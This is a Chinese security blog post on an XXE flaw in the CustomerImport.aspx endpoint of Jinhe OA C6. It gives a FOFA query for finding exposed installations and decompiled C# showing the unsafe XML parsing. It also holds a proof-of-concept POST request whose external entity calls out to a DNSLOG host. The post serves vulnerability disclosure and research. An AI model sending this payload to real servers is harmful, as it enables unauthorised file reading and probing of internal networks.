---
title: "金和OA CustomerImport.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ContractManagement-CustomerImport-xxe.html
asset_dir: assets/金和oa-customerimport.aspx-xxe漏洞
---

# 金和OA CustomerImport.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/4 13:32
* 270浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

网页浏览器

漏洞扫描服务

物流软件安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `CustomerImport.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `CustomerImport.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ContractManagement.dll` 将其进行反编译后找到 **CustomerImport** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.IsPostBack)
    return;
  ((Control) this).Page.Response.Write(this.ImportData());
  ((Control) this).Page.Response.End();
}
```

跟进 `ImportData` 方法

```
protected string ImportData()
{
  string str1 = string.Empty;
  DateTime now = DateTime.Now;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  XmlNode documentElement = (XmlNode) xmlDocument.DocumentElement;
```

深入探索

编程语言教程

漏洞修复方案

漏洞扫描器

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.ContractManagement/Importing/CustomerImport.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

[![金和OA CustomerImport.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA CustomerImport.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-ContractManagement-CustomerImport-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-ContractManagement-CustomerImport-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

文件大小转换

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ContractManagement-CustomerImport-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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